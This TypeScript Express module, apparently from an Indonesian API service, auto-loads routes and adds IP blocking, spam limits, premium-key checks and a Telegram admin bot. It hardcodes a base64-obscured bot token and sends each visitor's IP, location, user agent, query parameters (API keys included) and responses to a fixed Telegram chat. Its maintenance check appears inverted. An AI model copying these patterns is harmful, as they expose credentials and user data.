/*
  Saurus For You 💌 
*/
import { Application, Request, Response, NextFunction } from 'express'
import * as fs from 'fs'
import * as path from 'path'
import axios from 'axios'

let regRouter = new Set<string>()
let currentConfig: any = null
let appInstance: Application

// Premium keys cache
let premiumKeys: string[] = []
let premiumKeyLastFetch: number = 0
const PREMIUM_KEY_CACHE_TTL = 60 * 1000

let telegramToken: string = ''
const TELEGRAM_CHAT_ID = '-1003641120736'

// ========================
// IP BLOCK
// ========================
const BLOCK_FILE = '/tmp/blocked_ips.json'
let blockedIPs: Set<string> = new Set()
let maintenanceOverride: boolean | null = null

function loadBlockedIPs() {
  try {
    const raw = fs.readFileSync(BLOCK_FILE, 'utf-8')
    blockedIPs = new Set(JSON.parse(raw))
    console.log(`[Block] Loaded ${blockedIPs.size} blocked IPs`)
  } catch {
    blockedIPs = new Set()
  }
}

function saveBlockedIPs() {
  fs.writeFileSync(BLOCK_FILE, JSON.stringify([...blockedIPs]), 'utf-8')
}

loadBlockedIPs()

// ========================
// SPAM DETECTION
// ========================
const SPAM_WINDOW_MS = 10_000   // 10 detik
const SPAM_MAX_REQ   = 15       // max request per window
const spamMap = new Map<string, { count: number, firstSeen: number, warned: boolean }>()

function checkSpam(ip: string): boolean {
  const now = Date.now()
  const entry = spamMap.get(ip)

  if (!entry || now - entry.firstSeen > SPAM_WINDOW_MS) {
    spamMap.set(ip, { count: 1, firstSeen: now, warned: false })
    return false
  }

  entry.count++
  spamMap.set(ip, entry)

  if (entry.count >= SPAM_MAX_REQ && !entry.warned) {
    entry.warned = true
    blockedIPs.add(ip)
    saveBlockedIPs()
    notifySpamBlock(ip).catch(() => {})
    return true
  }

  return entry.count >= SPAM_MAX_REQ
}

/* =======================
   GITHUB API
======================= */
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || ''
const GITHUB_REPO  = 'saurusrawr/penting'

async function githubGet(filePath: string): Promise<string> {
  const { data } = await axios.get(
    `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`,
    {
      headers: {
        Authorization: `Bearer ${GITHUB_TOKEN}`,
        Accept: 'application/vnd.github.v3.raw',
        'Cache-Control': 'no-cache',
      },
      timeout: 5000,
    }
  )
  return String(data).trim()
}

async function githubUpdate(filePath: string, content: string, commitMsg: string) {
  const { data: meta } = await axios.get(
    `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`,
    {
      headers: { Authorization: `Bearer ${GITHUB_TOKEN}`, Accept: 'application/vnd.github.v3+json' },
      timeout: 5000,
    }
  )
  await axios.put(
    `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`,
    {
      message: commitMsg,
      content: Buffer.from(content).toString('base64'),
      sha: meta.sha,
    },
    {
      headers: { Authorization: `Bearer ${GITHUB_TOKEN}`, Accept: 'application/vnd.github.v3+json' },
      timeout: 5000,
    }
  )
}

/* =======================
   TELEGRAM TOKEN
======================= */
async function getTelegramToken(): Promise<string> {
  if (telegramToken) return telegramToken
  telegramToken = Buffer.from('ODM5MTE3NDc2MDpBQUdQRE1EVUdhWUVDT25QWm5rNXprdTlYUHJtUGJVWU1Faw==', 'base64').toString('utf-8')
  return telegramToken
}

async function sendTelegram(message: string, extra?: object): Promise<void> {
  try {
    const token = await getTelegramToken()
    if (!token) return
    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
      ...extra,
    }, { timeout: 5000 })
  } catch (e: any) {
    console.error('[Logger] Gagal kirim Telegram:', e.message)
  }
}

/* =======================
   NOTIF SPAM BLOCK
======================= */
async function notifySpamBlock(ip: string) {
  const ipInfo = await getIpInfo(ip)
  const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })

  console.warn(`[SPAM] IP ${ip} auto-blocked karena spam`)

  const msg = `🚨 <b>AUTO BLOCK — SPAM TERDETEKSI!</b>
━━━━━━━━━━━━━━━━━━━━

⚠️ IP ini melakukan request berlebihan dan otomatis diblokir.

🚩 IP: <code>${ip}</code>
🏳️ Negara: ${ipInfo.country}
🏙️ Kota: ${ipInfo.city}, ${ipInfo.region}
📡 ISP: ${ipInfo.isp}
⏰ Waktu: ${time} WIB
📊 Limit: ${SPAM_MAX_REQ} req / ${SPAM_WINDOW_MS / 1000}s

Ketik /unblockip ${ip} untuk membuka blokir.`

  await sendTelegram(msg, {
    reply_markup: {
      inline_keyboard: [[
        { text: '🔓 Unblock IP ini', callback_data: `unblock:${ip}` }
      ]]
    }
  })
}

/* =======================
   IP LOOKUP
======================= */
async function getIpInfo(ip: string): Promise<{ country: string, isp: string, city: string, region: string }> {
  try {
    const { data } = await axios.get(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,org`, { timeout: 4000 })
    return {
      country: data.country || '?',
      isp: data.isp || data.org || '?',
      city: data.city || '?',
      region: data.regionName || '?',
    }
  } catch {
    return { country: '?', isp: '?', city: '?', region: '?' }
  }
}

/* =======================
   PARSE USER AGENT
======================= */
function parseUA(ua: string): { device: string, os: string, browser: string } {
  let os = 'Unknown'
  let browser = 'Unknown'
  let device = 'Desktop'

  if (/android/i.test(ua)) { os = 'Android'; device = 'Mobile' }
  else if (/iphone|ipad/i.test(ua)) { os = 'iOS'; device = /ipad/i.test(ua) ? 'Tablet' : 'Mobile' }
  else if (/windows/i.test(ua)) os = 'Windows'
  else if (/macintosh|mac os/i.test(ua)) os = 'macOS'
  else if (/linux/i.test(ua)) os = 'Linux'

  if (/chrome\/[\d.]+/i.test(ua) && !/edg|opr/i.test(ua)) browser = `Chrome ${(ua.match(/chrome\/([\d.]+)/i)||[])[1]?.split('.')[0] || ''}`
  else if (/firefox\/[\d.]+/i.test(ua)) browser = `Firefox ${(ua.match(/firefox\/([\d.]+)/i)||[])[1]?.split('.')[0] || ''}`
  else if (/safari\/[\d.]+/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari'
  else if (/edg\/[\d.]+/i.test(ua)) browser = `Edge ${(ua.match(/edg\/([\d.]+)/i)||[])[1]?.split('.')[0] || ''}`
  else if (/opr\/[\d.]+/i.test(ua)) browser = 'Opera'

  return { device, os, browser }
}

/* =======================
   GET CLIENT IP
======================= */
function getClientIp(req: Request): string {
  return (
    (req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() ||
    req.headers['x-real-ip'] as string ||
    req.socket?.remoteAddress ||
    'unknown'
  )
}

/* =======================
   LOG REQUEST
======================= */
export async function logRouterRequest(
  req: Request,
  res: Response,
  responseBody?: any,
  statusCode?: number
): Promise<void> {
  const ip = getClientIp(req)
  const method = req.method
  const url = req.originalUrl || req.url
  const ua = req.headers['user-agent'] || 'unknown'
  const referer = req.headers['referer'] || '-'
  const time = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
  const lang = req.headers['accept-language']?.split(',')[0] || '-'
  const { device, os, browser } = parseUA(ua)
  const code = statusCode || res.statusCode || 200
  const codeEmoji = code >= 500 ? '🔴' : code >= 400 ? '🟡' : '🟢'

  // console log
  console.log(`[${time}] ${codeEmoji} ${code} | ${method} ${url} | IP: ${ip} | ${browser} | ${os} | ${device}`)

  ;(async () => {
    const ipInfo = await getIpInfo(ip)

    const queryStr = Object.keys(req.query).length
      ? '\n' + Object.entries(req.query).map(([k, v]) => `  • <code>${k}</code>: <code>${v}</code>`).join('\n')
      : ' <i>tidak ada</i>'

    // response summary
    let respStr = '<i>tidak direkam</i>'
    if (responseBody && typeof responseBody === 'object') {
      const preview = JSON.stringify(responseBody)
      respStr = `<code>${preview.length > 300 ? preview.substring(0, 300) + '...' : preview}</code>`
    }

    const apiDomain = currentConfig?.settings?.domain || 'api.kawaiiyumee.web.id'
    const fullUrl = `https://${apiDomain}${url}`

    const message = `🚨 <b>Akses API Baru!</b>
━━━━━━━━━━━━━━━━━━━━

🌐 <b>ENDPOINT</b>
🔗 <code>${method} ${url}</code>
${codeEmoji} Status: <b>${code}</b>
📋 Query:${queryStr}
🔁 Referer: ${referer}

📤 <b>RESPONSE</b>
${respStr}

⚙️ <b>DEVICE</b>
🖥️ Device: <code>${device}</code>
💻 OS: <code>${os}</code>
🌏 Browser: <code>${browser}</code>
🌐 Bahasa: ${lang}
📱 UA: <code>${ua.substring(0, 120)}</code>

📍 <b>LOKASI & JARINGAN</b>
🚩 IP: <code>${ip}</code>
🏳️ Negara: ${ipInfo.country}
🏙️ Kota: ${ipInfo.city}, ${ipInfo.region}
📡 ISP: ${ipInfo.isp}

⏰ <b>WAKTU</b>
🕐 ${time} WIB`

    await sendTelegram(message, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: '🌐 Buka API Docs', url: `https://${apiDomain}/docs` },
            { text: '🧪 Coba Endpoint', url: fullUrl },
          ],
          [
            { text: '🚫 Block IP ini', callback_data: `block:${ip}` },
          ]
        ]
      }
    })
  })().catch(() => {})
}

/* =======================
   PREMIUM KEYS
======================= */
async function getPremiumKeys(): Promise<string[]> {
  const now = Date.now()
  if (premiumKeys.length > 0 && now - premiumKeyLastFetch < PREMIUM_KEY_CACHE_TTL) return premiumKeys
  try {
    const raw = await githubGet('apikeyprem.json')
    const parsed = JSON.parse(raw)
    if (Array.isArray(parsed)) {
      premiumKeys = parsed
      premiumKeyLastFetch = now
      console.log(`[Premium] Keys loaded: ${premiumKeys.length} keys`)
    }
  } catch {
    console.error('[Premium] Failed to fetch premium keys')
  }
  return premiumKeys
}

/* =======================
   MAINTENANCE CHECK
======================= */
async function checkMaintenance(): Promise<string> {
  if (maintenanceOverride !== null) {
    return maintenanceOverride ? 'on' : 'off'
  }
  try {
    const status = await githubGet('database-api.txt')
    console.log(`[Maintenance] Status: "${status}"`)
    return status.toLowerCase()
  } catch {
    console.error('[Maintenance] Fetch failed, defaulting to ON')
    return 'on'
  }
}

/* =======================
   ADMIN BOT
======================= */
export function initAdminBot() {
  const ADMIN_IDS = (process.env.TELEGRAM_ADMIN_IDS || '').split(',').map(Number).filter(Boolean)

  if (!ADMIN_IDS.length) {
    console.warn('[Bot] TELEGRAM_ADMIN_IDS kosong, admin bot tidak aktif')
    return
  }

  let offset = 0

  async function reply(token: string, chatId: string, text: string, extra?: object) {
    await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
      chat_id: chatId, text, parse_mode: 'HTML', ...extra
    }, { timeout: 5000 }).catch(() => {})
  }

  async function answerCallback(token: string, callbackId: string, text: string) {
    await axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
      callback_query_id: callbackId, text, show_alert: true
    }, { timeout: 5000 }).catch(() => {})
  }

  async function handleBotCommand(token: string, chatId: string, text: string) {
    const apiDomain = currentConfig?.settings?.domain || 'api.kawaiiyumee.web.id'

    // /start
    if (text === '/start') {
      const maintStatus = await checkMaintenance()
      return reply(token, chatId, [
        '👾 <b>KawaiiYumee Admin Panel</b>',
        `🌐 <code>${apiDomain}</code>`,
        '',
        '━━━━━━━━━━━━━━━━━━━━',
        '🔧 <b>MAINTENANCE</b>',
        '  /setmaintenance on — nyalain maintenance',
        '  /setmaintenance off — matiin maintenance',
        '',
        '🚫 <b>IP MANAGEMENT</b>',
        '  /blockip &lt;ip&gt; — blokir IP',
        '  /unblockip &lt;ip&gt; — hapus blokir IP',
        '  /listip — lihat semua IP terblokir',
        '',
        '📊 <b>INFO</b>',
        '  /status — status server',
        '  /spamlist — lihat IP spam aktif',
        '',
        '🔑 <b>PREMIUM KEYS</b>',
        '  /addkeyprem &lt;key&gt; — tambah key premium',
        '  /delkeyprem &lt;key&gt; — hapus key premium',
        '  /listkeyprem — lihat semua key premium',
        '',
        '━━━━━━━━━━━━━━━━━━━━',
        `🔧 Maintenance sekarang: <b>${maintStatus === 'on' ? 'ON 🟡' : 'OFF 🟢'}</b>`,
        `🚫 Blocked IPs: <b>${blockedIPs.size}</b>`,
        `⏱️ Uptime: <b>${Math.floor(process.uptime() / 60)} menit</b>`,
      ].join('\n'), {
        reply_markup: {
          inline_keyboard: [
            [
              { text: '🌐 Buka Docs', url: `https://${apiDomain}/docs` },
              { text: '📊 Stats', url: `https://${apiDomain}/stats` },
            ],
            [
              { text: maintStatus === 'on' ? '🟢 Matiin Maintenance' : '🟡 Nyalain Maintenance', callback_data: `maint:${maintStatus === 'on' ? 'off' : 'on'}` }
            ]
          ]
        }
      })
    }

    // /blockip
    const blockMatch = text.match(/^\/blockip (.+)/)
    if (blockMatch) {
      const ip = blockMatch[1].trim()
      if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
        return reply(token, chatId, '❌ Format IP tidak valid bestie 😭\nContoh: <code>/blockip 123.456.789.0</code>')
      }
      if (blockedIPs.has(ip)) {
        return reply(token, chatId, `⚠️ IP <code>${ip}</code> sudah ada di daftar blokir.`)
      }
      blockedIPs.add(ip)
      saveBlockedIPs()
      const ipInfo = await getIpInfo(ip)
      return reply(token, chatId,
        `✅ IP <code>${ip}</code> berhasil diblokir.\n\n🏳️ ${ipInfo.country} | 🏙️ ${ipInfo.city} | 📡 ${ipInfo.isp}`,
        { reply_markup: { inline_keyboard: [[{ text: '🔓 Unblock', callback_data: `unblock:${ip}` }]] } }
      )
    }

    // /unblockip
    const unblockMatch = text.match(/^\/unblockip (.+)/)
    if (unblockMatch) {
      const ip = unblockMatch[1].trim()
      if (!blockedIPs.has(ip)) {
        return reply(token, chatId, `⚠️ IP <code>${ip}</code> tidak ada di daftar blokir.`)
      }
      blockedIPs.delete(ip)
      spamMap.delete(ip)
      saveBlockedIPs()
      return reply(token, chatId, `✅ IP <code>${ip}</code> berhasil diunblokir.`)
    }

    // /listip
    if (text === '/listip') {
      if (blockedIPs.size === 0) return reply(token, chatId, '📭 Belum ada IP yang diblokir.')
      const list = [...blockedIPs].map((ip, i) => `${i + 1}. <code>${ip}</code>`).join('\n')
      return reply(token, chatId, `🚫 <b>IP Terblokir (${blockedIPs.size}):</b>\n\n${list}`)
    }

    // /spamlist
    if (text === '/spamlist') {
      const active = [...spamMap.entries()].filter(([, v]) => v.count >= 5)
      if (!active.length) return reply(token, chatId, '✅ Tidak ada aktivitas spam saat ini.')
      const list = active.map(([ip, v]) => `• <code>${ip}</code> — ${v.count} req${blockedIPs.has(ip) ? ' 🚫 BLOCKED' : ''}`).join('\n')
      return reply(token, chatId, `⚠️ <b>Aktivitas Mencurigakan:</b>\n\n${list}`)
    }

    // /setmaintenance
    const maintMatch = text.match(/^\/setmaintenance (on|off)/)
    if (maintMatch) {
      const mode = maintMatch[1]
      try {
        await githubUpdate('database-api.txt', mode, `[bot] set maintenance ${mode}`)
        maintenanceOverride = null
        return reply(token, chatId, `🔧 Maintenance: <b>${mode === 'on' ? 'ON 🟡' : 'OFF 🟢'}</b>\n✅ GitHub updated.`)
      } catch (e: any) {
        maintenanceOverride = mode === 'on'
        return reply(token, chatId, `🔧 Maintenance: <b>${mode === 'on' ? 'ON 🟡' : 'OFF 🟢'}</b>\n⚠️ GitHub gagal, override lokal aktif.`)
      }
    }

    // /addkeyprem
    const addKeyMatch = text.match(/^\/addkeyprem (.+)/)
    if (addKeyMatch) {
      const newKey = addKeyMatch[1].trim()
      const keys = await getPremiumKeys()
      if (keys.includes(newKey)) {
        return reply(token, chatId, `⚠️ Key <code>${newKey}</code> sudah ada bestie 😭`)
      }
      keys.push(newKey)
      try {
        await githubUpdate('apikeyprem.json', JSON.stringify(keys, null, 2), `[bot] add premium key`)
        premiumKeys = keys
        premiumKeyLastFetch = Date.now()
        return reply(token, chatId, `✅ Key <code>${newKey}</code> berhasil ditambahkan!\n🔑 Total keys: <b>${keys.length}</b>`)
      } catch (e: any) {
        return reply(token, chatId, `❌ Gagal update GitHub: ${e.message}`)
      }
    }

    // /delkeyprem
    const delKeyMatch = text.match(/^\/delkeyprem (.+)/)
    if (delKeyMatch) {
      const delKey = delKeyMatch[1].trim()
      const keys = await getPremiumKeys()
      if (!keys.includes(delKey)) {
        return reply(token, chatId, `⚠️ Key <code>${delKey}</code> tidak ditemukan bestie 😭`)
      }
      const updated = keys.filter(k => k !== delKey)
      try {
        await githubUpdate('apikeyprem.json', JSON.stringify(updated, null, 2), `[bot] delete premium key`)
        premiumKeys = updated
        premiumKeyLastFetch = Date.now()
        return reply(token, chatId, `✅ Key <code>${delKey}</code> berhasil dihapus!\n🔑 Total keys: <b>${updated.length}</b>`)
      } catch (e: any) {
        return reply(token, chatId, `❌ Gagal update GitHub: ${e.message}`)
      }
    }

    // /listkeyprem
    if (text === '/listkeyprem') {
      const keys = await getPremiumKeys()
      if (!keys.length) return reply(token, chatId, '📭 Belum ada premium key.')
      const list = keys.map((k, i) => `${i + 1}. <code>${k}</code>`).join('\n')
      return reply(token, chatId, `🔑 <b>Premium Keys (${keys.length}):</b>\n\n${list}`)
    }

    // /status
    if (text === '/status') {
      const maintStatus = await checkMaintenance()
      const spamActive = [...spamMap.values()].filter(v => v.count >= 5).length
      return reply(token, chatId, [
        '📊 <b>Server Status</b>',
        '━━━━━━━━━━━━━━━━━━━━',
        `🔧 Maintenance: ${maintStatus === 'on' ? 'ON 🟡' : 'OFF 🟢'}`,
        `🚫 Blocked IPs: ${blockedIPs.size}`,
        `⚠️ IP Spam Aktif: ${spamActive}`,
        `⏱️ Uptime: ${Math.floor(process.uptime() / 3600)}j ${Math.floor((process.uptime() % 3600) / 60)}m`,
        `🔑 Override lokal: ${maintenanceOverride !== null ? (maintenanceOverride ? 'ON' : 'OFF') : 'tidak aktif'}`,
        `🔑 Premium keys: ${premiumKeys.length}`,
      ].join('\n'))
    }
  }

  async function handleCallbackQuery(token: string, callbackId: string, chatId: string, data: string, fromId: number) {
    if (!ADMIN_IDS.includes(fromId)) return

    // block:ip
    const blockCb = data.match(/^block:(.+)/)
    if (blockCb) {
      const ip = blockCb[1]
      if (blockedIPs.has(ip)) {
        return answerCallback(token, callbackId, `IP ${ip} sudah diblokir sebelumnya.`)
      }
      blockedIPs.add(ip)
      saveBlockedIPs()
      await answerCallback(token, callbackId, `✅ IP ${ip} berhasil diblokir!`)
      return
    }

    // unblock:ip
    const unblockCb = data.match(/^unblock:(.+)/)
    if (unblockCb) {
      const ip = unblockCb[1]
      blockedIPs.delete(ip)
      spamMap.delete(ip)
      saveBlockedIPs()
      return answerCallback(token, callbackId, `✅ IP ${ip} berhasil diunblokir!`)
    }

    // maint:on/off
    const maintCb = data.match(/^maint:(on|off)/)
    if (maintCb) {
      const mode = maintCb[1]
      try {
        await githubUpdate('database-api.txt', mode, `[bot] set maintenance ${mode}`)
        maintenanceOverride = null
      } catch {
        maintenanceOverride = mode === 'on'
      }
      return answerCallback(token, callbackId, `Maintenance ${mode === 'on' ? 'dinyalakan' : 'dimatikan'}!`)
    }
  }

  async function pollUpdates() {
    try {
      const token = await getTelegramToken()
      const { data } = await axios.get(`https://api.telegram.org/bot${token}/getUpdates`, {
        params: { offset, timeout: 30, allowed_updates: ['message', 'callback_query'] },
        timeout: 35000,
      })

      for (const update of data.result || []) {
        offset = update.update_id + 1

        // callback query (tombol inline)
        if (update.callback_query) {
          const cb = update.callback_query
          if (ADMIN_IDS.includes(cb.from?.id)) {
            await handleCallbackQuery(token, cb.id, String(cb.message?.chat?.id), cb.data, cb.from.id)
          }
          continue
        }

        const msg = update.message
        if (!msg?.text) continue
        if (!ADMIN_IDS.includes(msg.from?.id)) continue
        await handleBotCommand(token, String(msg.chat.id), msg.text.trim())
      }
    } catch (e: any) {
      if (!e.message?.includes('timeout')) console.error('[Bot] Poll error:', e.message)
    }
    setTimeout(pollUpdates, 1000)
  }

  pollUpdates()
  console.log('[Bot] Admin bot aktif (long polling)')
}

/* =======================
   INIT AUTOLOAD
======================= */
export const initAutoLoad = (app: Application, config: any, configPath: string) => {
  appInstance = app
  currentConfig = config

  console.log('[✓] Auto Load Activated')

  getPremiumKeys().catch(() => {})
  initAdminBot()

  loadRouter(app, config)

  if (fs.existsSync(configPath)) {
    fs.watch(configPath, (eventType, filename) => {
      if (filename && eventType === 'change') {
        console.log(`Config file changed: ${filename}`)
        try {
          const newConfig = JSON.parse(fs.readFileSync(configPath, 'utf-8'))
          currentConfig = newConfig
          console.log('[✓] Config reloaded successfully')
          reloadRouter()
        } catch (error) {
          console.error('[ㄨ] Failed to reload config:', error)
        }
      }
    })
  }

  const routerDir = path.join(process.cwd(), 'router')
  if (fs.existsSync(routerDir)) {
    console.log(`[i] Watching router directory: ${routerDir}`)
    fs.watch(routerDir, { recursive: true }, (eventType, filename) => {
      if (filename && (filename.endsWith('.ts') || filename.endsWith('.js'))) {
        console.log(`[✓] Route file changed: ${filename}`)
        const fullPath = path.join(routerDir, filename)
        if (require.cache[fullPath]) delete require.cache[fullPath]
        console.log(`Route cache cleared for: ${filename}`)
        reloadSingleRoute(filename)
      }
    })
  } else {
    console.warn(`[!] Router directory not found at: ${routerDir}`)
  }
}

const reloadSingleRoute = (filename: string) => {
  const normalized = filename.split(path.sep).join('/')
  const parts = normalized.split('/')
  const category = parts.length > 1 ? parts[parts.length - 2] : null
  const routeName = parts[parts.length - 1].replace(/\.(ts|js)$/, '')

  if (category && currentConfig?.tags?.[category]) {
    const route = currentConfig.tags[category].find((r: any) => r.filename === routeName)
    if (route) {
      const routeKey = `${route.method}:${route.endpoint}`
      regRouter.delete(routeKey)
      registerRoute(route, category)
    }
  }
}

const reloadRouter = () => {
  console.log('Reloading all routes...')
  regRouter.clear()
  loadRouter(appInstance, currentConfig)
}

export const loadRouter = (app: Application, config: any) => {
  const tags = config.tags
  const creatorName = config.settings.creator

  if (!tags) {
    console.error("[!] Error: 'tags' not found in config.json")
    return
  }

  Object.keys(tags).forEach((category) => {
    const routes = tags[category]
    routes.forEach((route: any) => {
      registerRoute(route, category, creatorName, app)
    })
  })
}

const registerRoute = (route: any, category: string, creatorName?: string, app?: Application) => {
  const targetApp = app || appInstance
  const targetCreator = creatorName || currentConfig?.settings?.creator

  if (!targetApp || !targetCreator) return

  const routeKey = `${route.method}:${route.endpoint}`
  if (regRouter.has(routeKey)) return

  const possibleBaseDirs = [
    path.join(__dirname, '..', 'router', category),
    path.join(process.cwd(), 'router', category),
    path.join(process.cwd(), 'dist', 'router', category)
  ]

  const extensions = ['.ts', '.js']
  let modulePath = ''

  outerLoop:
  for (const dir of possibleBaseDirs) {
    for (const ext of extensions) {
      const attemptPath = path.join(dir, `${route.filename}${ext}`)
      if (fs.existsSync(attemptPath)) {
        modulePath = attemptPath
        break outerLoop
      }
    }
  }

  if (modulePath) {
    try {
      try { delete require.cache[require.resolve(modulePath)] } catch {}

      const handlerModule = require(modulePath)
      const handler = handlerModule.default || handlerModule
      const middleware = handlerModule.middleware

      if (typeof handler === 'function') {
        const wrappedHandler = async (req: Request, res: Response, next: NextFunction) => {
          const clientIp = getClientIp(req)

          // IP BLOCK CHECK
          if (blockedIPs.has(clientIp)) {
            return res.status(403).json({
              creator: targetCreator,
              status: false,
              message: `🚫 IP kamu (${clientIp}) telah diblokir. Hubungi admin jika ini kesalahan.`
            })
          }

          // SPAM CHECK
          if (checkSpam(clientIp)) {
            return res.status(429).json({
              creator: targetCreator,
              status: false,
              message: `⚠️ Terdeteksi spam terus menerus, IP (${clientIp}) berhasil diblokir. Ketik /unblockip untuk membuka blokir.`
            })
          }

          // MAINTENANCE CHECK
          const maintenanceStatus = await checkMaintenance()
          if (maintenanceStatus === 'off') {
            return res.status(503).json({
              creator: targetCreator,
              status: false,
              maintenance: true,
              message: '🔧 API sedang dalam maintenance. Silakan coba beberapa saat lagi.'
            })
          }

          // PREMIUM API KEY CHECK
          if (route.needpremium === true) {
            const apikey = (req.query.apikey || req.headers['x-api-key'] || req.body?.apikey) as string
            if (!apikey || apikey.trim() === '') {
              return res.status(401).json({
                creator: targetCreator,
                status: false,
                message: '🔑 API ini membutuhkan apikey premium. Tambahkan parameter apikey='
              })
            }
            const keys = await getPremiumKeys()
            if (!keys.includes(apikey.trim())) {
              return res.status(403).json({
                creator: targetCreator,
                status: false,
                message: '❌ API key tidak valid atau tidak memiliki akses premium.'
              })
            }
          }

          // INJECT CREATOR + CAPTURE RESPONSE
          let capturedBody: any = null
          const originalJson = res.json.bind(res)
          res.json = function (body) {
            capturedBody = body
            if (body && typeof body === 'object' && !Array.isArray(body)) {
              return originalJson({ creator: targetCreator, ...body })
            }
            return originalJson(body)
          }

          try {
            await handler(req, res, next)
          } catch (err) {
            console.error(`Error in route ${route.endpoint}:`, err)
            res.status(500).json({
              error: 'Internal Server Error',
              message: err instanceof Error ? err.message : String(err)
            })
          }

          // LOG AFTER RESPONSE
          logRouterRequest(req, res, capturedBody, res.statusCode)
        }

        if (route.method === 'GET') targetApp.get(route.endpoint, wrappedHandler)
        else if (route.method === 'POST') {
          if (middleware) targetApp.post(route.endpoint, middleware, wrappedHandler)
          else targetApp.post(route.endpoint, wrappedHandler)
        }

        regRouter.add(routeKey)
        console.log(`[✓] LOADED: ${route.method} ${route.endpoint} -> ${path.basename(modulePath)}${route.needpremium ? ' 🔑 PREMIUM' : ''}`)
      } else {
        console.error(`[ㄨ] Invalid handler type in ${modulePath}`)
      }
    } catch (error) {
      console.error(`[ㄨ] Failed to load route ${route.endpoint} from ${modulePath}:`, error)
    }
  } else {
    console.error(`[!] FILE NOT FOUND: router/${category}/${route.filename}.ts`)
  }
}
